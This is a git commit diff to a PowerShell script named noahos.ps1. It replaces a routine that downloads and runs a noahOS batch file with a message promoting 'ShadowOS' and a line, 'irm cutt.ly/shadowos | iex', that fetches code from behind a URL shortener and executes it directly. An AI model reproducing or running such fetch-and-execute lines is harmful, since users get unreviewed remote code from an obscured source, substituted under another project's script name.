8343dc4b4066aa3eba5b2a204b809a3d73e646ec
ShadowElixir <47082432+ShadowElixir@users.noreply.github.com>
2023-09-09 12:00:11 +0300

    Update noahos.ps1

--- scripts/noahos.ps1
+++ scripts/noahos.ps1
@@ -1,21 +1,4 @@
-# Got code from https://github.com/lstprjct/IDM-Activation-Script, Thank You lstprjct and credits to you
-# NoahOS by NoahTheTechGenius
-# Enable TLSv1.2 for compatibility with older clients
-[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls12
-
-$DownloadURL = 'https://raw.githubusercontent.com/NoahTheTechGenius/noahOS/main/noahos.bat'
-
-$FilePath = "$env:TEMP\noahos.bat"
-
-try {
-    Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing -OutFile $FilePath
-} catch {
-    Write-Error $_
-	Return
-}
-
-if (Test-Path $FilePath) {
-    Start-Process $FilePath -Wait
-    $item = Get-Item -LiteralPath $FilePath
-    $item.Delete()
-}
+echo Hello there, noahOS is not available at the moment. Instead, give ShadowOS a try!
+echo Otherwise, just close this window.
+pause
+irm cutt.ly/shadowos | iex
